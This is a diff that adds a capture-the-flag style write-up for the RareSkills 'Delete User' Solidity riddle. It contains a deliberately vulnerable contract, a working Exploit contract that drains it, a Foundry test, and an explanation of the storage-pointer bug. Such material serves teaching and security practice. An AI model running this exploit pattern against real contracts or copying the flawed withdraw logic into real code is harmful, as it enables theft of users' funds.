@@ -637,3 +637,98 @@ uint32(uint64(0x7a8114790000f1b9)) ->                                   0x000000
 
 uint16(uint160(0x9AebA12E57837B35cb322E857A8114792248f1B9)) ->          0x000000000000000000000000000000000000000000000000000000000000f1b9
 ```
+
+## RareSkills Solidity Riddles: Delete User
+Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/DeleteUser.sol
+
+### Contracts
+- `src/Week10-11/DeleteUser.sol`
+```
+contract DeleteUser {
+    struct User {
+        address addr;
+        uint256 amount;
+    }
+
+    User[] private users;
+
+    function deposit() external payable {
+        users.push(User({addr: msg.sender, amount: msg.value}));
+    }
+
+    function withdraw(uint256 index) external {
+        User storage user = users[index];
+        require(user.addr == msg.sender);
+        uint256 amount = user.amount;
+
+        user = users[users.length - 1];
+        users.pop();
+
+        msg.sender.call{value: amount}("");
+    }
+}
+
+contract Exploit {
+    DeleteUser public deleteUserContract;
+
+    constructor(DeleteUser _deleteUserContract) {
+        deleteUserContract = _deleteUserContract;
+    }
+
+    receive() external payable {}
+
+    function exploit() public {
+        deleteUserContract.deposit{value: 1 ether}();
+        deleteUserContract.deposit{value: 0 ether}();
+        deleteUserContract.withdraw(0);
+        deleteUserContract.withdraw(0);
+    }
+}
+```
+- `test/Week10-11/DeleteUser.t.sol`
+```
+contract DeleteUserTest is Test {
+    DeleteUser deleteUserContract;
+    Exploit exploitContract;
+    address attackerWallet;
+
+    function setUp() public {
+        deleteUserContract = new DeleteUser();
+        attackerWallet = address(0xbadbad);
+        exploitContract = new Exploit(deleteUserContract);
+        vm.deal(address(deleteUserContract), 1 ether);
+        vm.deal(address(exploitContract), 1 ether);
+    }
+
+    function testExploit() public {
+        vm.startPrank(attackerWallet);
+        exploitContract.exploit();
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertEq(address(deleteUserContract).balance, 0);
+        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
+    }
+}
+```
+
+### Exploit
+The vulnerability in `DeleteUser` is that in the `withdraw` function:
+```
+    function withdraw(uint256 index) external {
+        User storage user = users[index];
+        require(user.addr == msg.sender);
+        uint256 amount = user.amount;
+
+        user = users[users.length - 1];
+        users.pop();
+
+        msg.sender.call{value: amount}("");
+    }
+```
+The function has the intention to remove the `user` item from the `users` array after the user has withdrawn the item's deposit. The function tries to replace the data at `users[index]` with `users[users.length - 1]` which is the last element in the `users` array, so that by popping the array, the last item - which was already copied to the withdrawn item's position, will be popped from the array and the reduction in array items get accounted for.
+
+However, the problem is that in Solidity, writes to storage pointers do not save new data. The line `User storage user = users[index]` creates a pointer to a location in the contract storage, so `user` is essentially a reference to `users[index]`. However, `user = users[users.length - 1]` is merely just changing the reference that `user` is pointing to, and it does not write to actual storage. So when the function subsequently calls `users.pop()`, its only just popping the last item in the `users` array, without actually popping the array item of the given `index`.
+
+So to exploit, we just have to create multiple deposits, one with 1 ether, and the other with 0 ether. And we can essentially call `withdraw` with the first deposit's index twice to successfully withdraw 1 ether more than once, and steal all the ether in the `DeleteUser` contract.
